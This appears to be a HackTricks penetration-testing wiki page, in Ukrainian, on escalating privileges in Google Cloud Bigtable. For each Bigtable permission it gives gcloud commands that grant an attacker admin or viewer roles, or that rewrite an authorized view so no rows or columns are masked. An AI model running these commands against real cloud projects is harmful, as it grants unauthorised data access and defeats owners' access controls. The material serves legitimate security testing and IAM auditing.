# GCP - Bigtable Privesc

{{#include ../../../banners/hacktricks-training.md}}

## Bigtable

Детальніше про Bigtable дивіться:

{{#ref}}
../gcp-services/gcp-bigtable-enum.md
{{#endref}}

### `bigtable.instances.setIamPolicy`

**Дозволи:** `bigtable.instances.setIamPolicy` (зазвичай також `bigtable.instances.getIamPolicy` щоб прочитати поточні прив'язки).

Володіння політикою IAM інстансу дозволяє надати собі роль **`roles/bigtable.admin`** (або будь-яку кастомну роль), яка поширюється на кожен кластер, таблицю, резервну копію і авторизований перегляд в інстансі.

<details><summary>Надати собі роль bigtable.admin на інстансі</summary>
```bash
gcloud bigtable instances add-iam-policy-binding <instance-id> \
--member='user:<attacker@example.com>' \
--role='roles/bigtable.admin'
```
</details>

> [!TIP]
> Якщо ви не можете перерахувати існуючі bindings, сформуйте новий документ політики і застосуйте його за допомогою `gcloud bigtable instances set-iam-policy`, переконавшись, що в ньому збережено ваш доступ.

Після отримання цього дозволу перегляньте техніки в розділі [**Bigtable Post Exploitation section**](../gcp-post-exploitation/gcp-bigtable-post-exploitation.md) для додаткових способів зловживання дозволами Bigtable.

### `bigtable.tables.setIamPolicy`

**Дозволи:** `bigtable.tables.setIamPolicy` (опціонально `bigtable.tables.getIamPolicy`).

Політики інстансу можуть бути жорстко налаштовані, одночасно делегуючи окремі таблиці. Якщо ви можете редагувати IAM таблиці, ви можете **підвищити себе до власника цільового набору даних** без втручання в інші робочі навантаження.

<details><summary>Надайте собі роль bigtable.admin для таблиці</summary>
```bash
gcloud bigtable tables add-iam-policy-binding <table-id> \
--instance=<instance-id> \
--member='user:<attacker@example.com>' \
--role='roles/bigtable.admin'
```
</details>

Після отримання цього дозволу перегляньте розділ [**Bigtable Post Exploitation section**](../gcp-post-exploitation/gcp-bigtable-post-exploitation.md) для технік, що показують інші способи зловживання дозволами Bigtable.


### `bigtable.backups.setIamPolicy`

**Дозволи:** `bigtable.backups.setIamPolicy`

Резервні копії можна відновити на **будь-який instance у будь-якому проєкті**, яким ви керуєте. Спочатку надайте вашій ідентичності доступ до резервної копії, після цього відновіть її в sandbox, де у вас є ролі Admin/Owner.

Якщо у вас є дозвіл `bigtable.backups.setIamPolicy`, ви можете надати собі дозвіл `bigtable.backups.restore`, щоб відновити старі резервні копії та спробувати отримати доступ до чутливої інформації.

<details><summary>Отримання власності над резервною копією (snapshot)</summary>
```bash
# Take ownership of the snapshot
gcloud bigtable backups add-iam-policy-binding <backup-id> \
--instance=<instance-id> --cluster=<cluster-id> \
--member='user:<attacker@example.com>' \
--role='roles/bigtable.admin'
```
</details>

Після отримання цього дозволу перегляньте [**Bigtable Post Exploitation section**](../gcp-post-exploitation/gcp-bigtable-post-exploitation.md), щоб дізнатися, як відновити резервну копію.


### Оновлення authorized view

**Permissions:** `bigtable.authorizedViews.update`

Authorized Views призначені для маскування рядків/стовпців. Зміна або видалення їх **усуває тонко налаштовані запобіжні механізми**, на які покладаються захисники.

<details><summary>Оновити authorized view, щоб розширити доступ</summary>
```bash
# Broaden the subset by uploading a permissive definition
gcloud bigtable authorized-views update <view-id> \
--instance=<instance-id> --table=<table-id> \
--definition-file=/tmp/permissive-view.json --ignore-warnings

# Json example not filtering any row or column
cat <<'EOF' > /tmp/permissive-view.json
{
"subsetView": {
"rowPrefixes": [""],
"familySubsets": {
"<SOME FAMILITY NAME USED IN THE CURRENT TABLE>": {
"qualifierPrefixes": [""]
}
}
}
}
EOF

# Describe the authorized view to get a family name
gcloud bigtable authorized-views describe <view-id> \
--instance=<instance-id> --table=<table-id>
```
</details>

Після отримання цього дозволу перевірте в [**Bigtable Post Exploitation section**](../gcp-post-exploitation/gcp-bigtable-post-exploitation.md) як читати з авторизованого подання.

### `bigtable.authorizedViews.setIamPolicy`

**Дозволи:**  `bigtable.authorizedViews.setIamPolicy`.

Зловмисник з цим дозволом може надати собі доступ до авторизованого подання, яке може містити чутливі дані, до яких у нього інакше не було б доступу.

<details><summary>Надайте собі доступ до авторизованого подання</summary>
```bash
# Give more permissions over an existing view
gcloud bigtable authorized-views add-iam-policy-binding <view-id> \
--instance=<instance-id> --table=<table-id> \
--member='user:<attacker@example.com>' \
--role='roles/bigtable.viewer'
```
</details>

Після виконання цієї перевірки дозволів у [**Bigtable Post Exploitation section**](../gcp-post-exploitation/gcp-bigtable-post-exploitation.md), щоб перевірити, як читати з авторизованого подання.



{{#include ../../../banners/hacktricks-training.md}}
